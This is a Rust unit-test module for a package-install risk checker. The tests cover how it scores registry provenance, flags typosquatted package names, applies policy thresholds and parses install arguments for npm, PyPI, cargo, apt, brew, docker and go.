            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        });
        assert_eq!(plan.verdict.action, Action::Block);
        assert!(plan.verdict.findings.iter().any(|finding| {
            finding.severity == Severity::High && finding.title.contains("coverage is incomplete")
        }));
    }

    #[test]
    fn plan_install_online_resolver_high_provenance_risk_warns() {
        // Alarming provenance (brand-new, ownerless, version-spiked, no repo,
        // yanked) stacks to a high score with no name tell — the chunk-6 value.
        use crate::package_risk::ApiProvenance;
        #[allow(deprecated)]
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_name: Some("totally-unknown-pkg".to_string()),
            package_age_days: Some(1),
            latest_version_age_days: Some(0),
            ownership_transferred: Some(true),
            version_spike: Some(true),
            recent_downloads: Some(3),
            has_source_repo: Some(false),
            yanked_or_deprecated: true,
            latest_version: Some("9.9.9".to_string()),
            ..Default::default()
        };
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| ApiSignals::Available {
            provenance: provenance.clone(),
        };
        let req = PlanRequest {
            manager: PackageManager::Npm,
            user_args: &["totally-unknown-pkg@9.9.9".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        };
        let plan = plan_install(&req);
        // The aggregate-risk finding must be present and at least Warn.
        assert!(
            plan.verdict.action == Action::Warn || plan.verdict.action == Action::Block,
            "alarming provenance must not Allow: action={:?} score={:?}",
            plan.verdict.action,
            plan.risk_breakdowns().next().map(|b| b.score),
        );
        assert!(
            plan.verdict
                .findings
                .iter()
                .any(|f| f.rule_id == RuleId::ThreatSuspiciousPackage),
            "expected an aggregate-risk finding: {:?}",
            plan.verdict.findings
        );
    }

    #[test]
    fn plan_install_online_resolver_unavailable_is_noted_and_degrades() {
        // A failed exact `--online` call is an explicit coverage gap — never a
        // silent Allow, and never a panic.
        let resolver = |_eco: Ecosystem, _name: &str, _version: &str| {
            ApiSignals::unavailable("connection refused")
        };
        let req = PlanRequest {
            manager: PackageManager::Cargo,
            user_args: &["some-crate@=1.0.0".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Resolver {
                exact: &resolver,
                name_only: &existence_unknown,
            },
        };
        let plan = plan_install(&req);
        assert_eq!(plan.verdict.action, Action::Warn);
        assert!(
            plan.notes.iter().any(|n| n.contains("unavailable")),
            "notes: {:?}",
            plan.notes
        );
    }

    #[test]
    fn risk_findings_dedupe_against_existing_threatintel_finding() {
        // An existing ThreatPackageSimilarName must suppress the aggregate
        // finding for the same package.
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "raect".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let existing = vec![Finding {
            rule_id: RuleId::ThreatPackageSimilarName,
            severity: Severity::Medium,
            title: "Package name similar to popular package: raect ≈ react".to_string(),
            description: "Package 'raect' in npm is within edit distance 1.".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }];
        // A breakdown with a high score but NO malicious_typosquat_of.
        use crate::package_risk::NameVsPopular;
        let signals = PackageSignals {
            ecosystem: Ecosystem::Npm,
            name: "raect".to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: NameVsPopular::NearPopular {
                popular_name: "react".to_string(),
                distance: 1,
            },
            malicious_typosquat_of: None,
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::offline(),
        };
        let breakdown = package_risk::score_package(&signals);
        let p = empty_policy();
        let produced = risk_findings_for(&pkg, &breakdown, &existing, &p);
        assert!(
            produced.is_empty(),
            "a name-match already present must suppress the aggregate finding: {produced:?}"
        );
    }

    #[test]
    fn risk_findings_typosquat_emitted_when_engine_missed_it() {
        // The package-risk DB found a typosquat the engine's pass missed
        // (different tables) → emit once.
        let pkg = PackageRef {
            ecosystem: Ecosystem::PyPI,
            name: "reqeusts".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        use crate::package_risk::NameVsPopular;
        let signals = PackageSignals {
            ecosystem: Ecosystem::PyPI,
            name: "reqeusts".to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: NameVsPopular::Unknown,
            malicious_typosquat_of: Some("requests".to_string()),
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::offline(),
        };
        let breakdown = package_risk::score_package(&signals);
        let p = empty_policy();
        let produced = risk_findings_for(&pkg, &breakdown, &[], &p);
        assert_eq!(produced.len(), 1);
        assert_eq!(produced[0].rule_id, RuleId::ThreatPackageTyposquat);
        assert_eq!(produced[0].severity, Severity::High);
    }

    #[test]
    fn fake_registry_client_drives_resolver_without_network() {
        let _global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate registry-history side effects");
        // The resolver seam works with a fixture client — no network.
        let client = FakeClient {
            result: Ok(RegistryMetadata {
                source: "npm".to_string(),
                package_name: Some("x".to_string()),
                latest_version: Some("1.0.0".to_string()),
                ..Default::default()
            }),
        };
        let (signals, _existence) =
            crate::registry_api::gather_api_signals(&client, Ecosystem::Npm, "x");
        assert!(matches!(signals, ApiSignals::Available { .. }));
    }

    // M6 ch1 — distro / docker / go backends.

    #[test]
    fn package_manager_m6_ch1_program_label_and_ecosystem_mapping() {
        // `Apt` maps to program `apt-get` but label `apt`.
        assert_eq!(PackageManager::Apt.program(), "apt-get");
        assert_eq!(PackageManager::Apt.label(), "apt");
        assert_eq!(PackageManager::Brew.program(), "brew");
        assert_eq!(PackageManager::Dnf.program(), "dnf");
        assert_eq!(PackageManager::Yum.program(), "yum");
        assert_eq!(PackageManager::Pacman.program(), "pacman");
        assert_eq!(PackageManager::Scoop.program(), "scoop");
        assert_eq!(PackageManager::Docker.program(), "docker");
        assert_eq!(PackageManager::Go.program(), "go");

        // install_subcommand: most `install`; pacman `-S`; docker `pull`.
        assert_eq!(PackageManager::Apt.install_subcommand(), "install");
        assert_eq!(PackageManager::Brew.install_subcommand(), "install");
        assert_eq!(PackageManager::Dnf.install_subcommand(), "install");
        assert_eq!(PackageManager::Yum.install_subcommand(), "install");
        assert_eq!(PackageManager::Pacman.install_subcommand(), "-S");
        assert_eq!(PackageManager::Scoop.install_subcommand(), "install");
        assert_eq!(PackageManager::Docker.install_subcommand(), "pull");
        assert_eq!(PackageManager::Go.install_subcommand(), "install");

        // Ecosystem mapping — each variant to its dedicated Ecosystem.
        assert_eq!(PackageManager::Apt.ecosystem(), Ecosystem::Apt);
        assert_eq!(PackageManager::Brew.ecosystem(), Ecosystem::Brew);
        assert_eq!(PackageManager::Dnf.ecosystem(), Ecosystem::Dnf);
        assert_eq!(PackageManager::Yum.ecosystem(), Ecosystem::Yum);
        assert_eq!(PackageManager::Pacman.ecosystem(), Ecosystem::Pacman);
        assert_eq!(PackageManager::Scoop.ecosystem(), Ecosystem::Scoop);
        assert_eq!(PackageManager::Docker.ecosystem(), Ecosystem::Docker);
        assert_eq!(PackageManager::Go.ecosystem(), Ecosystem::Go);
    }

    #[test]
    fn lacks_registry_adapter_matches_registry_api_dispatch() {
        // Pins this in agreement with `registry_api`'s `fetch` dispatch (the
        // source of truth); wiring a new adapter must flip the method here.
        assert!(!PackageManager::Npm.lacks_registry_adapter());
        assert!(!PackageManager::Pip.lacks_registry_adapter());
        assert!(!PackageManager::Cargo.lacks_registry_adapter());
        assert!(PackageManager::Apt.lacks_registry_adapter());
        assert!(PackageManager::Brew.lacks_registry_adapter());
        assert!(PackageManager::Dnf.lacks_registry_adapter());
        assert!(PackageManager::Yum.lacks_registry_adapter());
        assert!(PackageManager::Pacman.lacks_registry_adapter());
        assert!(PackageManager::Scoop.lacks_registry_adapter());
        assert!(PackageManager::Docker.lacks_registry_adapter());
        assert!(PackageManager::Go.lacks_registry_adapter());
    }

    #[test]
    fn no_registry_adapter_banner_uses_manager_label() {
        // Banner text is fixed/machine-readable; downstream consumers depend on
        // the exact wording.
        let banner = PackageManager::Apt.no_registry_adapter_banner();
        assert!(
            banner.contains("apt"),
            "banner must mention 'apt' (label, not 'apt-get'): {banner}"
        );
        assert!(
            banner.contains("no registry adapter"),
            "banner must call out the gap explicitly: {banner}"
        );
        assert!(
            banner.contains("threat-DB name match and command-shape rules only"),
            "banner must list the fallback signals: {banner}"
        );
        // Docker banner uses the docker label.
        let dbanner = PackageManager::Docker.no_registry_adapter_banner();
        assert!(dbanner.contains("docker"));
    }

    #[test]
    fn build_argv_apt_inserts_install_subcommand() {
        let argv = build_argv(PackageManager::Apt, &["nginx".to_string()]);
        assert_eq!(argv.program, "apt-get");
        assert_eq!(argv.args, vec!["install", "nginx"]);
        assert_eq!(argv.display(), "apt-get install nginx");
    }

    #[test]
    fn build_argv_pacman_inserts_sync_flag_at_argv1() {
        // pacman's argv[1] is `-S` (Sync); build_argv stays generic.
        let argv = build_argv(PackageManager::Pacman, &["firefox".to_string()]);
        assert_eq!(argv.program, "pacman");
        assert_eq!(argv.args, vec!["-S", "firefox"]);
        assert_eq!(argv.display(), "pacman -S firefox");
    }

    #[test]
    fn build_argv_docker_uses_pull_not_install() {
        let argv = build_argv(PackageManager::Docker, &["alpine:latest".to_string()]);
        assert_eq!(argv.program, "docker");
        assert_eq!(argv.args, vec!["pull", "alpine:latest"]);
    }

    #[test]
    fn parse_docker_specs_handles_tag_digest_and_implicit_namespace() {
        // Implicit `library/` namespace, no tag → version defaults to `latest`.
        let pkgs = parse_docker_specs(&["alpine".to_string()]);
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Docker);
        assert_eq!(pkgs[0].name, "library/alpine");
        assert_eq!(pkgs[0].version.as_version_str(), Some("latest"));

        // Explicit tag.
        let pkgs = parse_docker_specs(&["alpine:3.18".to_string()]);
        assert_eq!(pkgs[0].version.as_version_str(), Some("3.18"));

        // Digest form — version carries `sha256:...`.
        let pkgs = parse_docker_specs(&["alpine@sha256:abcdef0123456789".to_string()]);
        assert_eq!(pkgs.len(), 1);
        assert_eq!(
            pkgs[0].version.as_version_str(),
            Some("sha256:abcdef0123456789")
        );

        // Registry prefix preserved.
        let pkgs = parse_docker_specs(&["ghcr.io/owner/img:v1".to_string()]);
        assert_eq!(pkgs[0].name, "ghcr.io/owner/img");
        assert_eq!(pkgs[0].version.as_version_str(), Some("v1"));

        // Flags are skipped.
        let pkgs =
            parse_docker_specs(&["--platform=linux/amd64".to_string(), "alpine".to_string()]);
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "library/alpine");
    }

    #[test]
    fn parse_docker_specs_skips_value_after_value_bearing_flag() {
        // Regression: the value of `--platform linux/amd64` must be skipped too,
        // or it parses as a bogus `linux/amd64:latest` image.
        let pkgs = parse_docker_specs(&[
            "--platform".to_string(),
            "linux/amd64".to_string(),
            "alpine".to_string(),
        ]);
        assert_eq!(pkgs.len(), 1, "only `alpine` should parse, not the value");
        assert_eq!(pkgs[0].name, "library/alpine");

        // Same for `-v /host:/container alpine` (the mount value looks ref-like).
        let pkgs = parse_docker_specs(&[
            "-v".to_string(),
            "/host:/container".to_string(),
            "alpine".to_string(),
        ]);
        assert_eq!(pkgs.len(), 1, "only `alpine` should parse, not the mount");
        assert_eq!(pkgs[0].name, "library/alpine");

        // Inline `--flag=value` skips only the flag; the next positional parses.
        let pkgs = parse_docker_specs(&["-p=8080:80".to_string(), "alpine".to_string()]);
        assert_eq!(pkgs.len(), 1, "inline `-p=8080:80` skips one token only");
        assert_eq!(pkgs[0].name, "library/alpine");
    }

    #[test]
    fn parse_go_specs_defaults_version_to_latest() {
        // No `@version` → defaults to `latest`.
        let pkgs = parse_go_specs(&["github.com/spf13/cobra".to_string()]);
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Go);
        assert_eq!(pkgs[0].name, "github.com/spf13/cobra");
        assert_eq!(pkgs[0].version.as_version_str(), Some("latest"));

        // Explicit @latest.
        let pkgs = parse_go_specs(&["github.com/spf13/cobra@latest".to_string()]);
        assert_eq!(pkgs[0].version.as_version_str(), Some("latest"));

        // Explicit @v1.8.0.
        let pkgs = parse_go_specs(&["github.com/spf13/cobra@v1.8.0".to_string()]);
        assert_eq!(pkgs[0].version.as_version_str(), Some("v1.8.0"));

        // A non-module-shaped bareword (`nginx`) is skipped.
        let pkgs = parse_go_specs(&["nginx".to_string()]);
        assert!(
            pkgs.is_empty(),
            "non-module-shaped names must not be parsed"
        );

        // Flags are skipped.
        let pkgs = parse_go_specs(&["-v".to_string(), "github.com/x/y".to_string()]);
        assert_eq!(pkgs.len(), 1);
    }

    #[test]
    fn parse_go_specs_rejects_local_path_targets() {
        // Regression: `go install ./cmd/foo` was treated as a module because it
        // contains `/`. Local paths must be skipped entirely.
        let cases = vec![
            ".".to_string(),
            "..".to_string(),
            "./cmd/foo".to_string(),
            "../cmd/foo".to_string(),
            "./...".to_string(),
            "../../package".to_string(),
            "/abs/path/cmd/foo".to_string(),
            "/usr/local/src/proj".to_string(),
            "~/repo/cmd/foo".to_string(),
            "~".to_string(),
        ];
        for tok in &cases {
            let pkgs = parse_go_specs(std::slice::from_ref(tok));
            assert!(
                pkgs.is_empty(),
                "local path {tok:?} must not parse as a Go module"
            );
        }
        // Sanity: a real module still works alongside a local path.
        let pkgs = parse_go_specs(&[
            "./cmd/foo".to_string(),
            "github.com/spf13/cobra@v1.8.0".to_string(),
        ]);
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "github.com/spf13/cobra");
    }

    #[test]
    fn plan_install_apt_emits_banner_via_lacks_registry_adapter() {
        // M6 ch1 acceptance — apt plan reaches ALLOW, packages empty (no
        // adapter, no scoring), and the lacks-adapter flag drives the banner.
        let req = PlanRequest {
            manager: PackageManager::Apt,
            user_args: &["nginx".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert_eq!(
            plan.verdict.action,
            Action::Allow,
            "apt-get install nginx must Allow: {:?}",
            plan.verdict.findings,
        );
        assert!(
            plan.packages.is_empty(),
            "apt has no registry adapter — no scoring"
        );
        assert!(plan.manager.lacks_registry_adapter());
    }

    #[test]
    fn plan_install_docker_pull_extracts_image_ref() {
        let req = PlanRequest {
            manager: PackageManager::Docker,
            user_args: &["alpine:latest".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert_eq!(plan.argv.display(), "docker pull alpine:latest");
        assert_eq!(
            plan.verdict.action,
            Action::Allow,
            "docker pull alpine:latest must Allow: {:?}",
            plan.verdict.findings,
        );
        assert_eq!(plan.packages.len(), 1, "docker image ref must be extracted");
        assert_eq!(plan.packages[0].reference.ecosystem, Ecosystem::Docker);
        assert_eq!(plan.packages[0].reference.name, "library/alpine");
        assert_eq!(
            plan.packages[0].reference.version.as_version_str(),
            Some("latest")
        );
    }

    #[test]
    fn plan_install_go_install_extracts_module_with_default_latest() {
        // No `@version` — defaults to `latest`, mirroring `go install`.
        let req = PlanRequest {
            manager: PackageManager::Go,
            user_args: &["github.com/spf13/cobra".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert_eq!(
            plan.verdict.action,
            Action::Allow,
            "go install github.com/spf13/cobra must Allow (no schemeless-sink FP): {:?}",
            plan.verdict.findings,
        );
        assert_eq!(plan.packages.len(), 1);
        assert_eq!(plan.packages[0].reference.name, "github.com/spf13/cobra");
        assert_eq!(
            plan.packages[0].reference.version.as_version_str(),
            Some("latest")
        );
    }

    #[test]
    fn plan_install_distro_no_registry_adapter_note_is_specific() {
        // For distro backends the "no installable package name" note would
        // mislead (the name IS present); the note must name the missing adapter.
        let req = PlanRequest {
            manager: PackageManager::Brew,
            user_args: &["ripgrep".to_string()],
            db: None,
            policy: &empty_policy(),
            cwd: None,
            interactive: false,
            online: OnlineMode::Off,
        };
        let plan = plan_install(&req);
        assert!(
            plan.notes.iter().any(|n| n.contains("no registry adapter")),
            "the note must point at the missing-adapter gap: {:?}",
            plan.notes,
        );
        // The legacy "no installable package name" wording must NOT appear here.
        assert!(
            !plan
                .notes
                .iter()
                .any(|n| n.contains("no installable package name")),
            "distro backends with a name on the command line must NOT show the \
             misleading legacy note: {:?}",
            plan.notes,
        );
    }

    // M6 ch7 — policy-driven rule emission tests.

    /// Build a minimal `RiskBreakdown` carrying the given provenance.
    #[allow(deprecated)]
    fn breakdown_with_provenance(
        name: &str,
        eco: Ecosystem,
        nvp: NameVsPopular,
        provenance: ApiProvenance,
    ) -> RiskBreakdown {
        let signals = PackageSignals {
            ecosystem: eco,
            name: name.to_string(),
            version: None,
            threat_db_missing: false,
            name_vs_popular: nvp,
            malicious_typosquat_of: None,
            content_signals: ContentSignals::NotInspected,
            api: ApiSignals::Available { provenance },
        };
        package_risk::score_package(&signals)
    }

    #[test]
    fn package_policy_not_found_fires_when_signal_and_policy_align() {
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "missing-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_existence: PackageExistence::NotFound,
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "missing-pkg",
            Ecosystem::Npm,
            NameVsPopular::Unknown,
            provenance,
        );
        let mut policy = empty_policy();
        policy.package_policy.block_not_found = true;
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PackagePolicyNotFound
                    && f.severity == Severity::High),
            "PackagePolicyNotFound must fire High when signal+policy align: {findings:?}"
        );
    }

    #[test]
    fn package_policy_not_found_does_not_fire_when_existence_unknown() {
        // Unknown existence (offline) must stay silent even with
        // `block_not_found: true`.
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "some-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_existence: PackageExistence::Unknown,
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "some-pkg",
            Ecosystem::Npm,
            NameVsPopular::Unknown,
            provenance,
        );
        let mut policy = empty_policy();
        policy.package_policy.block_not_found = true;
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::PackagePolicyNotFound),
            "PackagePolicyNotFound must NOT fire on Unknown existence: {findings:?}"
        );
    }

    #[test]
    fn package_policy_newer_than_days_block_fires_on_block_threshold() {
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "fresh-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_age_days: Some(3),
            package_existence: PackageExistence::Exists,
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "fresh-pkg",
            Ecosystem::Npm,
            NameVsPopular::Unknown,
            provenance,
        );
        let mut policy = empty_policy();
        policy.package_policy.block_newer_than_days = Some(7);
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PackagePolicyNewerThanDays)
            .expect("expected PackagePolicyNewerThanDays finding");
        assert_eq!(
            f.severity,
            Severity::High,
            "block_newer_than_days crossed -> Block severity"
        );
    }

    #[test]
    fn package_policy_day_zero_blocks_only_packages_published_today() {
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "fresh-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let severity_for_age = |age_days| {
            let provenance = ApiProvenance {
                source: "npm".to_string(),
                package_age_days: Some(age_days),
                package_existence: PackageExistence::Exists,
                ..Default::default()
            };
            let breakdown = breakdown_with_provenance(
                "fresh-pkg",
                Ecosystem::Npm,
                NameVsPopular::Unknown,
                provenance,
            );
            let mut policy = empty_policy();
            policy.package_policy.block_newer_than_days = Some(0);
            risk_findings_for(&pkg, &breakdown, &[], &policy)
                .into_iter()
                .find(|finding| finding.rule_id == RuleId::PackagePolicyNewerThanDays)
                .map(|finding| finding.severity)
                .expect("age warning/block finding")
        };
        assert_eq!(severity_for_age(0), Severity::High);
        assert_eq!(
            severity_for_age(1),
            Severity::Medium,
            "a one-day-old package may warn but must not hit the day-zero block"
        );
    }

    #[test]
    fn package_policy_typosquat_distance_fires_on_near_popular_at_or_below_threshold() {
        let pkg = PackageRef {
            ecosystem: Ecosystem::PyPI,
            name: "reqeusts".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "pypi".to_string(),
            package_existence: PackageExistence::Exists,
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "reqeusts",
            Ecosystem::PyPI,
            NameVsPopular::NearPopular {
                popular_name: "requests".to_string(),
                distance: 1,
            },
            provenance,
        );
        let mut policy = empty_policy();
        policy.package_policy.block_typosquat_distance = Some(1);
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PackagePolicyTyposquatDistance),
            "PackagePolicyTyposquatDistance must fire at distance <= threshold: {findings:?}"
        );
    }

    #[test]
    fn package_policy_unknown_with_install_scripts_fires_on_network_or_shell() {
        use crate::package_risk::InstallScriptSignals;
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "unknown-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_existence: PackageExistence::Exists,
            install_script_signals: Some(InstallScriptSignals {
                has_network_call: true,
                has_shell_spawn: false,
                suspicious_patterns: vec![],
            }),
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "unknown-pkg",
            Ecosystem::Npm,
            NameVsPopular::Unknown,
            provenance,
        );
        let mut policy = empty_policy();
        policy
            .package_policy
            .block_install_scripts_for_unknown_packages = true;
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        assert!(
            findings.iter().any(|f| f.rule_id
                == RuleId::PackagePolicyUnknownPackageWithInstallScripts
                && f.severity == Severity::High),
            "PackagePolicyUnknownPackageWithInstallScripts must fire High: {findings:?}"
        );
    }

    #[test]
    fn package_policy_low_downloads_warns_when_below_threshold() {
        let pkg = PackageRef {
            ecosystem: Ecosystem::PyPI,
            name: "unfamiliar".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let provenance = ApiProvenance {
            source: "pypi".to_string(),
            package_existence: PackageExistence::Exists,
            recent_downloads: Some(5),
            ..Default::default()
        };
        let breakdown = breakdown_with_provenance(
            "unfamiliar",
            Ecosystem::PyPI,
            NameVsPopular::Unknown,
            provenance,
        );
        let mut policy = empty_policy();
        policy.package_policy.warn_low_downloads_below = Some(100);
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PackagePolicyLowDownloads)
            .expect("expected PackagePolicyLowDownloads finding");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn aggregate_threshold_reads_from_policy_not_constants() {
        // A provenance-only breakdown fires Medium under default thresholds and
        // escalates to High under tighter ones — proving thresholds are
        // policy-driven, not constants.
        #[allow(deprecated)]
        let provenance = ApiProvenance {
            source: "npm".to_string(),
            package_age_days: Some(1),
            ownership_transferred: Some(true),
            version_spike: Some(true),
            recent_downloads: Some(3),
            has_source_repo: Some(false),
            yanked_or_deprecated: true,
            latest_version: Some("9.9.9".to_string()),
            package_existence: PackageExistence::Exists,
            ..Default::default()
        };
        let pkg = PackageRef {
            ecosystem: Ecosystem::Npm,
            name: "test-pkg".to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        };
        let breakdown = breakdown_with_provenance(
            "test-pkg",
            Ecosystem::Npm,
            NameVsPopular::Unknown,
            provenance,
        );

        let policy = empty_policy();
        let findings = risk_findings_for(&pkg, &breakdown, &[], &policy);
        let sus = findings
            .iter()
            .find(|f| f.rule_id == RuleId::ThreatSuspiciousPackage)
            .expect("expected ThreatSuspiciousPackage on default thresholds");

        // Lower both thresholds far below the score → still High.
        let mut tight_policy = empty_policy();
        tight_policy.package_policy.warn_aggregate_score = Some(1);
        tight_policy.package_policy.block_aggregate_score = Some(1);
        let tight = risk_findings_for(&pkg, &breakdown, &[], &tight_policy);
        let tight_sus = tight
            .iter()
            .find(|f| f.rule_id == RuleId::ThreatSuspiciousPackage)
            .expect("tighter policy must still emit the finding");
        // Default-policy finding must be Medium or High (warn vs block).
        assert!(
            matches!(sus.severity, Severity::Medium | Severity::High),
            "default-policy aggregate finding must be Medium or High"
        );
        assert_eq!(
            tight_sus.severity,
            Severity::High,
            "extreme-tight thresholds must escalate to High"
        );
    }
}
